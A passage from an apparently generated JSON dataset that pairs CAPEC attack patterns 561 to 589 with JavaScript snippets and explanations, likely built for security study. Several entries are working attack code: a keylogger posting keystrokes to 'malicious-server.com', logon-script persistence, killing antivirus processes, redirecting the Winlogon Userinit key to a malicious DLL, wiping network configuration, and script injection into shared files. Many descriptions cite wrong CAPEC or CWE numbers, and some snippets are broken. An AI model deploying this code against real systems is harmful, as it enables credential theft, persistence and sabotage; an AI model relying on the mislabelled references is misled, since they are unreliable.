        "description": "This JavaScript code snippet demonstrates a simple TCP client that connects to a Windows Admin Share using hardcoded administrator credentials. The credentials are weak (CWE-521) and transmitted in plaintext (CWE-522), making them susceptible to interception. The code uses single-factor authentication (CWE-308) and relies solely on a password system (CWE-309), which can be vulnerable to capture-replay attacks (CWE-294). Additionally, there is no mechanism for password aging (CWE-262), and if implemented, it might have a long expiration period (CWE-263). This snippet embodies the main idea of the CAPEC by showing how an adversary could use stolen or guessed credentials to access Windows Admin Shares."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Path to the shared directory\nconst sharedDir = '/shared/files';\n\n// Malicious script to be injected\nconst maliciousScript = '<script>alert(\"Hacked!\");</script>';\n\n// Function to inject malicious script into a shared file\nfunction injectMaliciousScript(fileName) {\n  const filePath = path.join(sharedDir, fileName);\n  \n  // Check if the file exists\n  if (fs.existsSync(filePath)) {\n    // Read the original content\n    let content = fs.readFileSync(filePath, 'utf8');\n    \n    // Inject the malicious script\n    content += maliciousScript;\n    \n    // Write the modified content back to the file\n    fs.writeFileSync(filePath, content, 'utf8');\n    console.log(`Injected malicious script into ${fileName}`);\n  } else {\n    console.log(`File ${fileName} does not exist.`);\n  }\n}\n\n// Example usage\ninjectMaliciousScript('example.html');",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary manipulates a file in a shared directory by injecting a malicious script. The `injectMaliciousScript` function takes a file name, checks if the file exists in the shared directory, reads its content, appends a malicious script, and writes the modified content back to the file. This embodies the CAPEC 'Modify Shared File' by showing how an attacker can add malicious content to a shared file. The code also touches on related CWEs such as 'Improper Access Control' (CWE-284) by not restricting access to the shared directory, and 'Unrestricted Upload of File with Dangerous Type' (CWE-434) by allowing the injection of a script that can be executed when the file is opened."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, 'public', req.url);\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('404 Not Found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory and serves them to clients. The code does not implement proper access control (CWE-284), allowing any file in the 'public' directory to be accessed. Additionally, it stores files under the web root (CWE-219) and serves them without parsing or validation (CWE-433). This setup can be exploited by an attacker to upload and execute malicious files, embodying the main idea of the CAPEC 'Add Malicious File to Shared Webroot'."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "const fs = require('fs');\nconst logonScriptPath = '/etc/profile.d/logonScript.sh';\n\n// CWE-798: Use of Hard-coded Credentials\nconst hardCodedPassword = 'P@ssw0rd123';\n\n// CWE-284: Improper Access Control\nfs.chmodSync(logonScriptPath, '777');\n\n// CWE-259: Use of Hard-coded Password\nfs.appendFileSync(logonScriptPath, `\necho 'Running malicious code'\n# CWE-520: .NET Misconfiguration: Use of Impersonation\nsudo -u root echo 'Malicious code executed with root privileges'\n`);\n\nconsole.log('Logon script modified successfully.');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker modifies a logon script to execute malicious code whenever a user logs in. The code first sets the permissions of the logon script to be writable by anyone (CWE-284: Improper Access Control). It then appends malicious commands to the logon script, including a command that runs with root privileges (CWE-520: .NET Misconfiguration: Use of Impersonation). The snippet also includes hard-coded credentials (CWE-798 and CWE-259), which could be used by an attacker to gain unauthorized access. This example embodies the main idea of the CAPEC 'Run Software at Logon' by showing how an attacker can maintain persistence and potentially move laterally within a system by modifying logon scripts."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nconst commonPasswords = ['password123', '123456', 'qwerty'];\n\nfunction authenticate(username, password) {\n  // Simulate a password check\n  return users.includes(username) && commonPasswords.includes(password);\n}\n\nfunction passwordSprayAttack() {\n  for (let password of commonPasswords) {\n    for (let user of users) {\n      if (authenticate(user, password)) {\n        console.log(`Compromised: ${user} with password: ${password}`);\n      }\n    }\n  }\n}\n\npasswordSprayAttack();",
        "description": "This JavaScript code snippet demonstrates a basic password spraying attack. The 'users' array contains a list of user accounts, and the 'commonPasswords' array contains a list of common passwords. The 'authenticate' function simulates a password check by verifying if the username and password are in the respective arrays. The 'passwordSprayAttack' function iterates over each common password and attempts to authenticate each user with that password. If successful, it logs the compromised user and password. This code embodies the main idea of CAPEC-111 (Password Spraying) by showing how an attacker can try a small list of common passwords against multiple user accounts to gain access. The code also highlights related CWEs such as weak password requirements (CWE-521), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "const crypto = require('crypto');\n\nfunction hashPassword(password) {\n  const hash = crypto.createHash('sha256');\n  hash.update(password);\n  return hash.digest('hex');\n}\n\nconst password = 'user_password';\nconst hashedPassword = hashPassword(password);\nconsole.log(`Hashed Password: ${hashedPassword}`);",
        "description": "This JavaScript code snippet demonstrates a vulnerable approach to hashing passwords. The `hashPassword` function uses the SHA-256 hashing algorithm to hash a password without incorporating a salt. This is related to CWE-759, which highlights the use of a one-way hash without a salt, making the hashed passwords susceptible to rainbow table attacks. The code embodies the deprecated CAPEC concept of dumping password hashes, as it shows how passwords can be hashed in a way that is not secure, leading to potential exploitation."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Using an obsolete function to read a file\nfs.readFileSync('/path/to/sensitive/data.txt', 'utf8', (err, data) => {\n  if (err) throw err;\n  console.log(data);\n});\n\n// Making a security decision based on DNS lookup\nconst userInput = 'example.com';\ndns.lookup(userInput, (err, address) => {\n  if (err) throw err;\n  if (address === '192.168.1.1') {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the deprecated CAPEC 'Obtain Data via Utilities' by using related CWEs. The code reads sensitive data from a file using the obsolete 'fs.readFileSync' function, which is related to CWE-477 (Use of Obsolete Function). Additionally, it makes a security decision based on a DNS lookup, which is related to CWE-247 (Reliance on DNS Lookups in a Security Decision). The code highlights the risks of using outdated functions and making security decisions based on potentially unreliable DNS information."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "document.addEventListener('keydown', function(event) {\n  let keylog = localStorage.getItem('keylog') || '';\n  keylog += event.key;\n  localStorage.setItem('keylog', keylog);\n});\n\nfunction sendKeylog() {\n  let keylog = localStorage.getItem('keylog');\n  if (keylog) {\n    fetch('http://malicious-server.com/collect', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify({ data: keylog })\n    });\n    localStorage.removeItem('keylog');\n  }\n}\n\nsetInterval(sendKeylog, 60000);",
        "description": "This JavaScript code snippet demonstrates a simple keylogger that captures all keystrokes made by a user and stores them in the browser's localStorage. Every minute, the stored keystrokes are sent to a malicious server. This embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by capturing user input, which could include sensitive information like passwords. The code also touches on related CWEs: it exploits the use of password systems (CWE-309), potentially captures hard-coded credentials (CWE-798), and stores credentials insecurely (CWE-522)."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Log sensitive information to a file\n      fs.appendFile('user_data.log', body + '\\n', err => {\n        if (err) throw err;\n      });\n      res.end('Data received');\n    });\n  } else {\n    res.end('Send a POST request');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests. When a POST request is received, it captures the data sent by the user and logs it to a file named 'user_data.log'. This embodies the main idea of CAPEC-Collect Data as Provided by Users, where an attacker captures information that a user legitimately enters into a system. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-214 (Invocation of Process Using Visible Sensitive Information), by logging potentially sensitive user data to a file without proper security measures."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // Use of deprecated function 'unescape'\n  let query = unescape(req.url);\n\n  // Unchecked error condition\n  try {\n    let data = JSON.parse(query);\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify(data));\n  } catch (e) {\n    // Error condition ignored\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. It demonstrates the use of a deprecated function 'unescape' to process the URL query string, which is an example of CWE-477 (Use of Obsolete Function). Additionally, the code includes an unchecked error condition where the JSON parsing errors are caught but not handled, representing CWE-391 (Unchecked Error Condition). The main idea of the CAPEC is to highlight vulnerabilities arising from the use of deprecated functions and the failure to handle errors properly, which can lead to security issues such as authentication bypass or data modification."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "const fs = require('fs');\nconst logFilePath = '/var/log/app.log';\n\nfunction logEvent(event) {\n  // CWE-778: Insufficient Logging\n  if (!event || !event.type) {\n    return;\n  }\n\n  // CWE-532: Insertion of Sensitive Information into Log File\n  if (event.type === 'login' && event.details.password) {\n    delete event.details.password;\n  }\n\n  const logEntry = `${new Date().toISOString()} - ${event.type}: ${JSON.stringify(event.details)}\\n`;\n\n  // CWE-779: Logging of Excessive Data\n  if (logEntry.length > 1024) {\n    console.warn('Log entry too large, skipping...');\n    return;\n  }\n\n  // Simulate blocking log delivery to central repository (CAPEC-Block Logging to Central Repository)\n  try {\n    fs.appendFileSync(logFilePath, logEntry);\n  } catch (err) {\n    console.error('Failed to write to log file:', err);\n  }\n}\n\n// Example usage\nlogEvent({ type: 'login', details: { user: 'admin', password: 'secret' } });\nlogEvent({ type: 'error', details: { message: 'Something went wrong', code: 500 } });",
        "description": "This JavaScript code snippet demonstrates a logging function that embodies the main idea of CAPEC 'Block Logging to Central Repository' by simulating the prevention of log delivery to a central repository. The function `logEvent` handles logging events with considerations for several CWEs: CWE-778 (Insufficient Logging) by checking if the event and its type are defined, CWE-532 (Insertion of Sensitive Information into Log File) by removing sensitive information like passwords from the log, and CWE-779 (Logging of Excessive Data) by skipping log entries that are too large. The code attempts to write log entries to a local file, simulating a scenario where logs are not delivered to a central repository, thus hiding potential indicators of compromise."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction uploadFile(filePath, fileContent) {\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  if (!filePath.endsWith('.txt')) {\n    throw new Error('Only .txt files are allowed');\n  }\n\n  // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n  const safeFilePath = path.join(__dirname, 'uploads', path.basename(filePath));\n\n  // CWE-774: Allocation of File Descriptors or Handles Without Limits or Throttling\n  const fileDescriptor = fs.openSync(safeFilePath, 'w');\n\n  // CWE-409: Improper Handling of Highly Compressed Data (Data Amplification)\n  const inflatedContent = fileContent.repeat(1000); // Artificially inflate file size\n\n  fs.writeFileSync(fileDescriptor, inflatedContent);\n  fs.closeSync(fileDescriptor);\n\n  console.log('File uploaded successfully');\n}\n\n// Example usage\ntry {\n  uploadFile('example.txt', 'This is a test content');\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable file upload function that embodies the main idea of CAPEC-126: Artificially Inflate File Sizes. The function `uploadFile` allows uploading of files but has several security weaknesses. It restricts uploads to .txt files (CWE-434) but relies on the file extension for validation (CWE-646). It allocates file descriptors without limits (CWE-774) and artificially inflates the file content by repeating it 1000 times, which can lead to a Denial of Service condition (CWE-409). The code highlights how an adversary could exploit these weaknesses to inflate file sizes and potentially exhaust storage resources."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction listProcesses() {\n  exec('ps aux', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error executing command: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Error in command output: ${stderr}`);\n      return;\n    }\n    console.log(`Current Processes:\\n${stdout}`);\n  });\n}\n\nlistProcesses();",
        "description": "This JavaScript code snippet uses Node.js to execute a shell command that lists all running processes on the system (`ps aux`). The output of this command is then printed to the console. This embodies the main idea of the CAPEC 'Process Footprinting' by exposing information about the currently running processes. The code does not implement any access control, meaning any user who can run this script can see the process list, which can include sensitive information. This relates to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), as it exposes potentially sensitive system information without proper authorization checks."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction getServiceInfo() {\n  exec('tasklist /svc', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error executing command: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Error in command output: ${stderr}`);\n      return;\n    }\n    console.log(`Service Information: ${stdout}`);\n  });\n}\n\ngetServiceInfo();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command ('tasklist /svc') that retrieves information about the services running on the target system. The 'exec' function from the 'child_process' module is used to run the command. The output, which includes sensitive system information, is then printed to the console. This code embodies the main idea of the CAPEC 'Services Footprinting' by demonstrating how an adversary could exploit functionality meant for authorized users to gather information about the services on a target system. The related CWEs are represented by the exposure of sensitive information (CWE-200, CWE-497) and the invocation of a process with visible sensitive information (CWE-214)."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getUserAccounts() {\n  exec('net user', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`User Accounts: ${stdout}`);\n  });\n}\n\ngetUserAccounts();",
        "description": "This JavaScript code snippet uses Node.js's 'child_process' module to execute the 'net user' command, which lists all user accounts on a Windows system. The output of this command is then logged to the console. This code embodies the main idea of the CAPEC 'Account Footprinting' by demonstrating how an adversary could exploit system commands to gather information about domain accounts. The related CWEs are represented in the following ways: CWE-200 and CWE-497 are illustrated by the exposure of sensitive user account information to unauthorized actors, CWE-214 is shown by the potential visibility of sensitive command-line arguments, and CWE-529 is implied by the improper handling of access control information."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction listLocalGroups() {\n  exec('net localgroup', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Local Groups: ${stdout}`);\n  });\n}\n\nlistLocalGroups();",
        "description": "This JavaScript code snippet uses Node.js's 'child_process' module to execute the 'net localgroup' command, which lists all local groups on a Windows system. The output of this command is then printed to the console. This embodies the main idea of CAPEC-Group Permission Footprinting, where an adversary exploits functionality to identify information about user groups and their permissions. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing group information to unauthorized users, and CWE-214 (Invocation of Process Using Visible Sensitive Information) by running a command that could reveal sensitive information."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getUserLastLoginTimes(directory) {\n  const files = fs.readdirSync(directory);\n  const userLoginTimes = {};\n\n  files.forEach(file => {\n    if (file === 'ntuser.dat') {\n      const filePath = path.join(directory, file);\n      const stats = fs.statSync(filePath);\n      userLoginTimes[directory] = stats.mtime;\n    }\n  });\n\n  return userLoginTimes;\n}\n\nconst userDirectories = ['/home/user1', '/home/user2'];\nuserDirectories.forEach(dir => {\n  const loginTimes = getUserLastLoginTimes(dir);\n  console.log(`User directory: ${dir}, Last login time: ${loginTimes[dir]}`);\n});",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit the 'Owner Footprinting' vulnerability by accessing the last modified times of 'ntuser.dat' files in user directories. The code iterates through a list of user directories, checks for the presence of 'ntuser.dat' files, and retrieves their last modified times, which can indicate the last login times of the users. This information can be used to inform further targeted malicious behavior. The code embodies the main idea of CAPEC-200 (Exposure of Sensitive Information to an Unauthorized Actor) by exposing sensitive login information, and CAPEC-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by accessing system-level information without proper authorization."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "const exec = require('child_process').exec;\n\n// Hard-coded credentials (CWE-798)\nconst adminPassword = 'admin123';\n\n// Function to disable security software\nfunction disableSecuritySoftware(password) {\n  if (password === adminPassword) {\n    // Improper access control (CWE-284)\n    exec('taskkill /F /IM antivirus.exe', (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Error: ${error.message}`);\n        return;\n      }\n      if (stderr) {\n        console.error(`Stderr: ${stderr}`);\n        return;\n      }\n      console.log(`Stdout: ${stdout}`);\n    });\n  } else {\n    console.log('Invalid password');\n  }\n}\n\ndisableSecuritySoftware('admin123');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can disable security software by exploiting improper access control (CWE-284) and using hard-coded credentials (CWE-798). The `disableSecuritySoftware` function takes a password as an argument and checks it against a hard-coded admin password. If the password matches, it executes a command to kill an antivirus process, effectively disabling the security software. This represents the CAPEC 'Disable Security Software' by showing how an attacker can exploit weak access control and hard-coded credentials to disable security mechanisms."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "const fs = require('fs');\nconst registryKey = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit';\nconst maliciousDllPath = 'C:\\\\malicious\\\\malicious.dll';\n\ntry {\n  // CWE-15: External Control of System or Configuration Setting\n  // CWE-427: Uncontrolled Search Path Element\n  // CWE-798: Use of Hard-coded Credentials\n  const command = `reg add \"${registryKey}\" /v Userinit /t REG_SZ /d ${maliciousDllPath} /f`;\n  require('child_process').execSync(command);\n  console.log('Registry key modified to load malicious DLL at startup.');\n} catch (error) {\n  console.error('Failed to modify registry key:', error);\n}",
        "description": "This JavaScript code snippet demonstrates how an attacker might exploit the 'Replace Winlogon Helper DLL' vulnerability (CAPEC) by modifying a Windows registry key to load a malicious DLL at startup. The code uses Node.js to execute a command that changes the 'Userinit' registry key to point to a malicious DLL. This embodies CWE-15 (External Control of System or Configuration Setting) by allowing external control over a critical system setting, CWE-427 (Uncontrolled Search Path Element) by potentially allowing unintended actors to control the DLL path, and CWE-798 (Use of Hard-coded Credentials) by hardcoding the path to the malicious DLL. The code is a concise representation of how an attacker could persist their code on a Windows system by exploiting this vulnerability."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = req.url;\n  let responseMessage = '';\n\n  if (url === '/admin') {\n    responseMessage = 'Access Denied';\n  } else if (url === '/user') {\n    responseMessage = 'User Page';\n  } else {\n    responseMessage = 'Not Found';\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(responseMessage);\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code creates a simple HTTP server that listens on port 8080. The server responds differently based on the requested URL. If the URL is '/admin', it responds with 'Access Denied', if the URL is '/user', it responds with 'User Page', and for any other URL, it responds with 'Not Found'. This code snippet embodies the concept of 'System Footprinting' (CAPEC-170) by allowing an adversary to probe the server and observe different responses based on the requested URL. The different responses can reveal information about the server's internal state and accessible paths, which aligns with CWE-204 (Observable Response Discrepancy) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSecurityTools() {\n  exec('wmic product get name,version', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`Installed Software: ${stdout}`);\n  });\n}\n\ngetSecurityTools();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command that retrieves a list of installed software on a Windows system. The 'wmic product get name,version' command is used to get the names and versions of installed products, which may include security tools. This embodies the main idea of CAPEC-170 (Security Software Footprinting) by attempting to gather information about installed security software. The code also touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) as it exposes potentially sensitive information about installed software. The use of 'exec' to run system commands can be risky and may lead to CWE-1395 (Dependency on Vulnerable Third-Party Component) if the command or its output is not properly handled."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "const net = require('net');\n\n// Vulnerable function to establish a communication channel\nfunction establishConnection(target) {\n  const client = new net.Socket();\n  client.connect(8080, target, () => {\n    console.log('Connected to target:', target);\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString());\n  });\n\n  client.on('error', (err) => {\n    console.error('Connection error:', err.message);\n  });\n\n  client.on('close', () => {\n    console.log('Connection closed');\n  });\n}\n\n// Simulate route disabling by an adversary\nfunction disableRoute() {\n  console.log('Route disabled. Communication severed.');\n  // Here, we simulate the route being disabled by closing the connection\n  client.destroy();\n}\n\n// Example usage\nconst target = '192.168.1.1';\nestablishConnection(target);\n\n// Simulate an attack after 5 seconds\nsetTimeout(disableRoute, 5000);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that establishes a communication channel to a target using the 'net' module. The function 'establishConnection' connects to a specified target and handles data reception, errors, and connection closure. The 'disableRoute' function simulates an adversary disabling the network route, severing the communication channel by destroying the client connection. This embodies the CAPEC 'Route Disabling' attack pattern, where the route between two entities is targeted. The code also reflects related CWEs, such as improper restriction of communication channels and race conditions, by not ensuring the integrity and correct endpoint of the communication."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "const fs = require('fs');\n\nfunction disableNetworkHardware() {\n  try {\n    // Simulate disabling network hardware by modifying a critical configuration file\n    fs.writeFileSync('/etc/network/interfaces', '');\n    console.log('Network hardware disabled.');\n  } catch (err) {\n    console.error('Failed to disable network hardware:', err);\n  }\n}\n\ndisableNetworkHardware();",
        "description": "This JavaScript code snippet simulates the disabling of network hardware by modifying a critical configuration file. The `disableNetworkHardware` function attempts to overwrite the '/etc/network/interfaces' file, which is typically used to configure network interfaces on Unix-like systems. By writing an empty string to this file, the code effectively disables the network hardware, preventing it from performing its intended service. This action embodies the main idea of the CAPEC 'Disabling Network Hardware' by simulating a physical disconnection or power down of critical equipment. The code also indirectly touches on related CWEs, such as improper restriction of software interfaces to hardware features (CWE-1256) and improper protection for outbound error messages and alert signals (CWE-1320), by not ensuring proper access control and error handling."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "const net = require('net');\n\nconst BGP_PORT = 179;\nconst TARGET_AS = '192.0.2.1';\nconst MALICIOUS_AS = '198.51.100.1';\n\nconst client = new net.Socket();\nclient.connect(BGP_PORT, TARGET_AS, () => {\n  console.log('Connected to target AS');\n  // Send a BGP update message to withdraw a route\n  const bgpWithdrawMessage = Buffer.from('withdraw route message');\n  client.write(bgpWithdrawMessage);\n  console.log('Sent BGP withdraw message');\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString());\n  // Simulate insufficient control of network message volume\n  for (let i = 0; i < 1000; i++) {\n    client.write(data);\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a BGP Route Disabling attack. The code connects to a target Autonomous System (AS) using the Border Gateway Protocol (BGP) on port 179. Once connected, it sends a BGP update message to withdraw a route, effectively making the network inaccessible. The code also simulates insufficient control of network message volume by repeatedly sending received data back to the target, which could lead to network amplification. This snippet embodies the main idea of the CAPEC by showing how an adversary can disrupt network availability through BGP route manipulation and related weaknesses such as insufficient control of network traffic."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  // CWE-601: Open Redirect\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n    return;\n  }\n\n  // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n  const clientIp = req.connection.remoteAddress;\n  require('dns').reverse(clientIp, (err, hostnames) => {\n    if (err || !hostnames.length) {\n      res.writeHead(403, { 'Content-Type': 'text/plain' });\n      res.end('Access Denied');\n      return;\n    }\n\n    // CWE-79: Cross-site Scripting\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end(`<h1>Welcome, ${hostnames[0]}</h1>`);\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates several security weaknesses related to the CAPEC 'DNS Domain Seizure'. The server processes incoming requests and performs the following actions:\n\n1. **CWE-601: Open Redirect** - The server checks for a 'redirect' query parameter and redirects the user to the specified URL without validation, which can be exploited for phishing attacks.\n\n2. **CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action** - The server performs a reverse DNS lookup on the client's IP address to obtain the hostname and makes a security decision based on this information. This is insecure because the IP address may not be truly associated with the hostname.\n\n3. **CWE-79: Cross-site Scripting** - The server includes the hostname in the response without proper sanitization, making it vulnerable to XSS attacks.\n\nThe code represents the main idea of the CAPEC 'DNS Domain Seizure' by showing how improper handling of DNS and security-critical actions can lead to vulnerabilities that an adversary could exploit to disrupt access to a targeted service."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "const net = require('net');\n\nclass SensitiveData {\n  constructor(secret) {\n    this.secret = secret;\n  }\n}\n\nfunction deserialize(data) {\n  return eval('(' + data + ')');\n}\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    try {\n      const obj = deserialize(data.toString());\n      console.log('Deserialized object:', obj);\n    } catch (e) {\n      console.error('Deserialization error:', e);\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Example of sending malicious data\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  const maliciousPayload = '{\"secret\":\"hacked\", \"__proto__\": {\"toString\": () => { return \"process.exit()\" }}}';\n  client.write(maliciousPayload);\n  client.end();\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable server that deserializes untrusted data using the `eval` function, which is inherently unsafe. The `SensitiveData` class contains sensitive information, and the `deserialize` function uses `eval` to convert the incoming string data back into an object. An attacker can exploit this by sending a malicious payload that manipulates the deserialization process, potentially leading to remote code execution. This example embodies the main idea of CAPEC-74 (Object Injection) and highlights CWE-502 (Deserialization of Untrusted Data) and CWE-499 (Serializable Class Containing Sensitive Data). The code also touches on CWE-77 (Command Injection) by demonstrating how special elements in the payload can alter the intended behavior of the deserialization process."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Malicious Page</title>\n</head>\n<body>\n    <h1>Welcome to the Malicious Page</h1>\n    <iframe id=\"hiddenFrame\" src=\"https://legitimate-site.com\" style=\"display:none;\"></iframe>\n    <script>\n        // Wait for the iframe to load\n        document.getElementById('hiddenFrame').onload = function() {\n            var iframe = document.getElementById('hiddenFrame').contentWindow;\n            // Attempt to interact with the legitimate site\n            try {\n                var sensitiveData = iframe.document.getElementById('sensitiveData').innerText;\n                console.log('Extracted Data: ' + sensitiveData);\n            } catch (e) {\n                console.log('Failed to access iframe content: ' + e);\n            }\n        };\n    </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Cross Frame Scripting (XFS) attack. The malicious page contains a hidden iframe that loads a legitimate website. Once the iframe is loaded, the malicious JavaScript attempts to access and interact with the content of the legitimate site. This can lead to unauthorized access to sensitive information. The attack leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by embedding the legitimate site in an iframe and attempting to manipulate it. The script also hints at potential XSS vulnerabilities (CWE-79, CWE-82) by trying to extract data from the iframe, which could be exploited if the legitimate site is not properly sanitizing its content."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  var userInput = document.location.hash.substring(1);\n  var targetElement = document.getElementById('output');\n  targetElement.innerHTML = userInput;\n});",
        "description": "This JavaScript code snippet demonstrates a DOM-Based XSS vulnerability. When the page loads, it extracts the fragment identifier (hash) from the URL and directly inserts it into the innerHTML of an element with the ID 'output'. This code does not perform any input validation or output encoding, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the hash, which would be executed when the page processes the hash value. This example embodies the main idea of CAPEC-63 (DOM-Based XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
